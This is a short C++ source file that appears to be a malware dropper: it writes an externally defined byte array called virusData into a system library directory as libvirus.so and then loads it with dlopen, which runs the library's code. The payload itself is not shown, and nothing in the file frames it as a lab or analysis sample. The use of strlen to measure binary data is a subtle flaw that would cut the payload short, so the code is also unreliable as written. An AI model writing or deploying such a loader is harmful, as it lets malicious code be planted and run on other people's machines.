#include <cstdio>
#include <dlfcn.h>
#include <cstring>

extern const char virusData[];

int main()
{
    FILE *soFile = fopen("/lib/x86_64-linux-gnu/libvirus.so", "wb");
    fwrite(virusData, 1, strlen(virusData), soFile);
    fclose(soFile);
    void *handle = dlopen("libvirus.so", RTLD_LAZY | RTLD_LOCAL);
    dlclose(handle);
    return 0;
}
